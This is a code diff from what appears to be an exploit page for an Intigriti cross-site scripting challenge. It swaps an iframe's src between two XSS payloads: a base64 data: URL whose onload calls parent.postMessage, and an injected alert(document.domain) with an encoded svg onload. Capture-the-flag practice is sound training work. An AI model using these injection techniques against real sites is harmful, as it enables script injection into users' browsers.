@@ -7,7 +7,7 @@
         var iframe = document.createElement("iframe");
         iframe.id = `6666`;
         iframe.name = `helloworld`; 
-        iframe.src = `https://challenge.intigriti.io/1/#data:text/html;var%20text=text;var%20html=html;alert(xss)//;base64,PGh0bWw+PGJvZHkgb25sb2FkPXhzcygpPjxzY3JpcHQ+IGZ1bmN0aW9uIHhzcygpIHsgcGFyZW50LnBvc3RNZXNzYWdlKHsneHNzJzogIm4wdG0zIn0sICcqJyk7IH07IDwvc2NyaXB0Pg==?`
+        iframe.src = `https://challenge.intigriti.io/1/#data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e?`
         //iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`;
         //iframe.onclick = function(e){
         //  window.open(this.contentWindow.name, this.src);
